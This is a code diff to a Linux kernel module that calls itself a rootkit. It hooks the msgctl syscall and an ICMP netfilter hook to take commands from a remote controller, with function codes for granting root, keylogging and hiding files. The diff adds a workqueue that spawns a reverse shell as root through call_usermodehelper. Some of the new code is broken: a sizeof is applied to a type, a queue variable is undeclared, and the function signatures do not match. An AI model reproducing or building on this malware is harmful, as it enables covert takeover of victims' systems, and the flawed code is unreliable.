@@ -32,6 +32,7 @@
 #include <linux/types.h>
 #include <linux/udp.h>
 #include <linux/unistd.h>
+#include <linux/workqueue.h>
 #include <linux/version.h>
 #include <net/inet_sock.h>
 #include "khook/engine.c"
@@ -55,6 +56,11 @@ typedef struct legacy_timer_emu {
 typedef struct timer_list _timer;
 #endif
 
+typedef struct shell_command_task {
+	struct work_struct work;
+	char* command;
+} shell_command_task;
+
 // TODO: Extract this to an h file to avoid duplication.
 #define GET_ROOT 0
 #define KEYLOGGER_ENABLE 1
@@ -63,11 +69,11 @@ typedef struct timer_list _timer;
 #define FILE_HIDE_RM 4
 #define FILE_HIDE_SHOW 5
 
-// This action_task struct is what is actually passed to the LKM.
-typedef struct action_task {
+// This task_from_controller struct is what is actually passed to the LKM.
+typedef struct task_from_controller {
 	int func_code;
 	char* file_hide_str;
-} action_task;
+} task_from_controller;
 
 /**
  * Global defines and variables.
@@ -76,9 +82,11 @@ typedef struct action_task {
 #define POLLING_INTERVAL 1500
 #define MAGIC_ROOT_NUM 31337
 #define MAX_TASK_SIZE 200
+
 static _timer polling_timer;
 static struct nf_hook_ops icmp_hook;
 static __be32 attacker_ip = 0;
+struct workqueue_struct* shell_work_queue;
 
 // Module parameters
 
@@ -120,9 +128,9 @@ void log_error(const char* message) {
 }
 
 /**
- * Handler for incoming action_tasks. Frees task memory if it doesn't return.
+ * Handler for incoming task_from_controllers. Frees task memory if it doesn't return.
  */
-int handle_task(action_task* task) {
+int handle_task(task_from_controller* task) {
 	printk(KERN_EMERG "Handling function code: %d\n", task->func_code);
 
 	switch (task->func_code) {
@@ -164,7 +172,7 @@ int handle_task(action_task* task) {
  */
 KHOOK_EXT(long, __x64_sys_msgctl, const struct pt_regs*);
 static long khook___x64_sys_msgctl(const struct pt_regs* regs) {
-	action_task* task;
+	task_from_controller* task;
 	int error;
 
 	if (regs->di == INT_MAX && regs->si == INT_MAX) {
@@ -321,11 +329,19 @@ static void do_something_on_interval(unsigned long data) {
 }
 
 /**
- * Execute code in user-space.
+ * Work queue function
  */
+int add_shell_task_to_queue(char* path, char* ip, char* port) {
+	struct shell_command_task* task;
+	task = kmalloc(sizeof(*shell_command_task), GFP_KERNEL);
 
-static void free_argv(struct subprocess_info* info) {
-	kfree(info->argv);
+	if (!task) {
+		return -1;
+	}
+
+	INIT_WORK(&task->work, &run_shell_command);
+	task->command = create_reverse_shell_cmd();
+	return queue_work(work_queue, &task->work);
 }
 
 /**
@@ -337,7 +353,7 @@ static void free_argv(struct subprocess_info* info) {
  * In this rootkit, we will primarily use this function to spawn a
  * reverse shell.
  */
-int run_command(char* run_cmd) {
+int run_shell_command(char* run_cmd) {
 	struct subprocess_info* info;
 	static char* envp[] = {
 		"HOME=/",
@@ -349,7 +365,7 @@ int run_command(char* run_cmd) {
 	char** argv = kmalloc(sizeof(char* [5]), GFP_KERNEL);
 
 	if (!argv) {
-		goto out_of_mem;
+		return -ENOMEM;
 	}
 
 	argv[0] = "/bin/sh";
@@ -357,13 +373,7 @@ int run_command(char* run_cmd) {
 	argv[2] = run_cmd;
 	argv[3] = NULL;
 
-	info = call_usermodehelper_setup(argv[0], argv, envp, GFP_KERNEL, NULL, free_argv, NULL);
-	return call_usermodehelper_exec(info, UMH_WAIT_EXEC);
-
-free_argv:
-	kfree(argv);
-out_of_mem:
-	return -ENOMEM;
+	return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
 }
 
 /**
